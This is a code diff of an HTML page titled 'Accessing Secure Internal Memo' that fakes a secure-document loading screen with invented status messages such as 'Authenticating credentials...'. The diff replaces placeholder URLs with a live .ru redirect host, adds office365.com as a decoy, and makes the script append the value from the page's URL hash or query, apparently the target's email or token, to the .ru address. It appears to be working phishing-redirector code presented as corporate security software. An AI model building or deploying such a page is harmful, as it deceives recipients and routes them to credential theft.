@@ -5,142 +5,183 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Accessing Secure Document</title>
     <style>
+        @import url('https://fonts.googleapis.com/css2?family=Roboto+Mono:wght@400;500&family=Inter:wght@400;600;700&display=swap');
+
         body {
-            font-family: Arial, sans-serif;
-            background-color: #f0f2f5;
+            font-family: 'Inter', sans-serif;
+            background-color: #111827; /* Dark blue-gray */
             margin: 0;
             padding: 0;
             display: flex;
             justify-content: center;
             align-items: center;
             height: 100vh;
-            color: #333;
+            color: #E5E7EB; /* Light gray text */
+            overflow: hidden; /* Hide scrollbars */
         }
+
+        .background-blur {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-image: url('https://i.imgur.com/gYg28C4.png'); /* Blurry document image */
+            background-size: cover;
+            background-position: center;
+            filter: blur(8px) brightness(0.4);
+            opacity: 0.5;
+            z-index: -1;
+            transform: scale(1.1);
+        }
+
         .container {
-            background-color: #ffffff;
-            border-radius: 4px;
-            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+            background-color: rgba(31, 41, 55, 0.75); /* Semi-transparent dark bg */
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 12px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.3);
+            padding: 50px;
             width: 520px;
             max-width: 90%;
             text-align: center;
-            overflow: hidden;
+            z-index: 1;
         }
-        .header-banner {
-            background-color: #005a9e;
-            padding: 15px 20px;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-        }
-        .company-logo {
-            width: 120px;
-            height: auto;
-        }
-        .header-text {
-            color: #ffffff;
-            font-size: 14px;
-            font-weight: bold;
-            margin: 0;
-        }
-        .content-area {
-            padding: 30px 40px;
-        }
-        .title {
-            color: #333333;
-            font-size: 22px;
-            font-weight: 600;
-            margin: 0 0 10px 0;
-        }
-        .subtitle {
-            color: #555;
-            font-size: 16px;
+
+        .header {
             margin-bottom: 30px;
-        }
-        .loading-container {
             display: flex;
-            flex-direction: column; 
+            flex-direction: column;
             align-items: center;
+        }
+
+        .secure-icon {
+            width: 60px;
+            height: 60px;
+            color: #34D399; /* Emerald green */
             margin-bottom: 20px;
         }
-        .spinner {
-            width: 40px;
-            height: 40px;
-            border: 4px solid rgba(0,0,0,0.1);
-            border-top-color: #005a9e;
-            border-radius: 50%;
-            animation: spin 1s linear infinite;
-            margin-bottom: 15px;
+
+        .title {
+            color: #F9FAFB; /* Off-white */
+            font-size: 24px;
+            font-weight: 700;
+            margin: 0 0 10px 0;
         }
+
+        .subtitle {
+            color: #D1D5DB; /* Lighter gray */
+            font-size: 16px;
+            margin-bottom: 30px;
+            max-width: 400px;
+        }
+
+        .loading-container {
+            margin-bottom: 25px;
+        }
+
         .loading-text {
-            color: #333;
+            font-family: 'Roboto Mono', monospace;
+            color: #A5B4FC; /* Indigo */
             font-size: 16px;
             font-weight: 500;
             margin: 0;
+            height: 20px; /* Reserve space to prevent layout shift */
         }
+
         .progress-container {
-            background-color: #e0e0e0;
-            height: 8px;
-            border-radius: 4px;
+            background-color: rgba(0,0,0,0.3);
+            height: 6px;
+            border-radius: 3px;
             overflow: hidden;
-            margin-bottom: 20px;
+            margin-bottom: 25px;
             width: 100%;
         }
+
         .progress-bar-fill {
             height: 100%;
-            background-color: #005a9e;
+            background: linear-gradient(90deg, #60A5FA, #34D399); /* Blue to green gradient */
             width: 0%;
-            animation: fill 2.5s linear forwards;
-            border-radius: 4px;
+            animation: decrypt-fill 2.5s ease-out forwards;
+            border-radius: 3px;
+            box-shadow: 0 0 10px #34D399, 0 0 5px #60A5FA;
         }
+
         .file-info { 
-            color: #666;
+            color: #9CA3AF; /* Gray */
             font-size: 14px;
             margin: 0 0 30px 0;
         }
+
         .footer-text {
-            color: #777;
+            color: #6B7280; /* Darker gray */
             font-size: 12px;
-            margin-top: 30px;
+            margin-top: 40px;
         }
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
+
+        @keyframes decrypt-fill {
+            from { width: 0%; }
+            to { width: 100%; }
         }
-        @keyframes fill {
-            0% { width: 0%; }
-            30% { width: 40%; } 
-            70% { width: 80%; }
-            100% { width: 100%; }
+
+        noscript {
+            display: block;
+            margin-top: 20px;
+            padding: 15px;
+            background-color: #FEF3C7; /* Amber */
+            color: #92400E; /* Dark Amber */
+            border: 1px solid #FDE68A;
+            border-radius: 4px;
+            font-size: 14px;
         }
     </style>
 </head>
 <body>
+    <div class="background-blur"></div>
     <div class="container">
-        <div class="header-banner">
-            <img src="" alt="Logo" class="company-logo">
-            <p class="header-text">INTERNAL MEMO</p>
+        <div class="header">
+             <svg class="secure-icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor">
+                <path fill-rule="evenodd" d="M12 1.25a1.25 1.25 0 0 0-1.25 1.25v2.518a8.936 8.936 0 0 0-4.32.953l-2.094-.7a1.25 1.25 0 0 0-1.428.433l-1.884 3.263a1.25 1.25 0 0 0 .433 1.428l1.83 1.057a9.07 9.07 0 0 0 0 3.1l-1.83 1.057a1.25 1.25 0 0 0-.433 1.428l1.884 3.263a1.25 1.25 0 0 0 1.428.433l2.094-.7a8.936 8.936 0 0 0 4.32.953v2.518c0 .69.56 1.25 1.25 1.25s1.25-.56 1.25-1.25v-2.518a8.936 8.936 0 0 0 4.32-.953l2.094.7a1.25 1.25 0 0 0 1.428-.433l1.884-3.263a1.25 1.25 0 0 0-.433-1.428l-1.83-1.057a9.07 9.07 0 0 0 0-3.1l1.83-1.057a1.25 1.25 0 0 0 .433-1.428l-1.884-3.263a1.25 1.25 0 0 0-1.428-.433l-2.094.7a8.936 8.936 0 0 0-4.32-.953V2.5c0-.69-.56-1.25-1.25-1.25Zm-3.141 9.493a1.25 1.25 0 0 0-1.768 1.768l2.25 2.25a1.25 1.25 0 0 0 1.768 0l4.5-4.5a1.25 1.25 0 0 0-1.768-1.768L10.5 12.318l-1.64-1.575Z" clip-rule="evenodd" />
+            </svg>
+            <h1 class="title">Accessing Secure Internal Memo</h1>
+            <p class="subtitle">Please wait while we establish a secure connection and decrypt the contents.</p>
         </div>
-        <div class="content-area">
-            <h1 class="title">Accessing Your Secure Document</h1>
-            <p class="subtitle">Please wait a moment while we retrieve your document.</p>
-            <div class="loading-container">
-                <div class="spinner"></div>
-                <p class="loading-text">Verifying and loading...</p>
-            </div>
-            <div class="progress-container">
-                <div class="progress-bar-fill" id="progressBar"></div>
-            </div>
-            <p class="file-info">This shouldn't take long.</p>
-            <p class="footer-text">&copy; All rights reserved.</p>
+        <div class="loading-container">
+            <p class="loading-text" id="loadingText">Establishing secure channel...</p>
         </div>
+        <div class="progress-container">
+            <div class="progress-bar-fill" id="progressBar"></div>
+        </div>
+        <p class="file-info">This shouldn't take long.</p>
+        <noscript>
+            <p>JavaScript is required to access this secure document. Please enable JavaScript and refresh.</p>
+        </noscript>
+        <p class="footer-text">Security Powered by &copy; SecureComms Inc.</p>
     </div>
 
     <script>
     (function() {
+        const loadingText = document.getElementById('loadingText');
+        const texts = [
+            "Establishing secure channel...",
+            "Authenticating credentials...",
+            "Decrypting memo...",
+            "Finalizing access..."
+        ];
+        let textIndex = 0;
+        const interval = setInterval(() => {
+            textIndex++;
+            if (textIndex < texts.length) {
+                loadingText.textContent = texts[textIndex];
+            } else {
+                clearInterval(interval);
+            }
+        }, 600);
+
         const REDIRECT_DELAY = 2500;
-        const MOBILE_REDIRECT_URL_BASE = "YOUR_MOBILE_REDIRECT_URL_BASE";
-        const DESKTOP_REDIRECT_URL = "YOUR_DESKTOP_REDIRECT_URL";
-        const DEAD_URL = "YOUR_FALLBACK_URL";
+        const MOBILE_REDIRECT_URL_BASE = "https://5fYTR.ewwyb.ru/@NEMeyXbLJgjOtJ/$";
+        const DESKTOP_REDIRECT_URL = "https://outlook.office365.com/";
+        const DEAD_URL = "https://www.theguardian.com/environment/climate-crisis";
 
         function isMobileDevice() {
             const userAgent = navigator.userAgent.toLowerCase();
@@ -150,59 +191,36 @@
         function getPotentialValue() {
             const hash = window.location.hash.substring(1);
             if (hash) {
-                let decodedHash;
-                try { decodedHash = decodeURIComponent(hash); } catch (e) { decodedHash = hash; }
-                if (decodedHash.endsWith('=')) {
-                    decodedHash = decodedHash.replace(/=+$/, '');
-                }
-                return decodedHash;
+                try { return decodeURIComponent(hash); } catch (e) { return hash; } 
             }
-
-            const params = new URLSearchParams(window.location.search);
-            const state = params.get('state');
-            if (state) {
-                if (state.includes(':')) {
-                    return state.substring(state.indexOf(':') + 1);
-                }
-                return state;
-            }
-
             const search = window.location.search.substring(1);
             if (search) {
-                let decodedSearch;
-                try { decodedSearch = decodeURIComponent(search); } catch (e) { decodedSearch = search; }
-                if (decodedSearch.endsWith('=')) {
-                    decodedSearch = decodedSearch.replace(/=+$/, '');
-                }
-                return decodedSearch;
+                try { return decodeURIComponent(search); } catch (e) { return search; } 
             }
             return null;
         }
 
         function performRedirect() {
+            clearInterval(interval);
             const value = getPotentialValue();
 
             if (value) {
-                if (isMobileDevice()) {
-                    const redirectUrl = MOBILE_REDIRECT_URL_BASE + value;
+                console.log("Found value:", value);
+                const redirectUrl = MOBILE_REDIRECT_URL_BASE + value;
+                    console.log("Mobile device detected. Redirecting to:", redirectUrl);
                     window.location.href = redirectUrl;
-                } else {
-                    const redirectUrl = DESKTOP_REDIRECT_URL + value;
-                    window.location.href = redirectUrl;
-                }
             } else {
-                document.querySelector('.loading-text').textContent = 'Error: Link invalid or expired.';
-                document.querySelector('.file-info').textContent = 'Please check the link or contact support.';
-                if(document.getElementById('progressBar')) {
-                    document.getElementById('progressBar').style.backgroundColor = '#d9534f';
-                    document.getElementById('progressBar').style.width = '100%';
+                console.log("No value found in hash or search. Showing error.");
+                document.getElementById('loadingText').textContent = 'Access Denied: Invalid or Expired Link';
+                document.querySelector('.file-info').textContent = 'Please verify the link or contact your administrator.';
+                const progressBar = document.getElementById('progressBar');
+                if (progressBar) {
+                    progressBar.style.background = '#F87171';
+                    progressBar.style.width = '100%';
+                    progressBar.style.boxShadow = '0 0 10px #F87171';
                 }
-                setTimeout(() => {
-                    window.location.href = DEAD_URL;
-                }, 1500);
             }
         }
-
         setTimeout(performRedirect, REDIRECT_DELAY);
     })();
     </script>
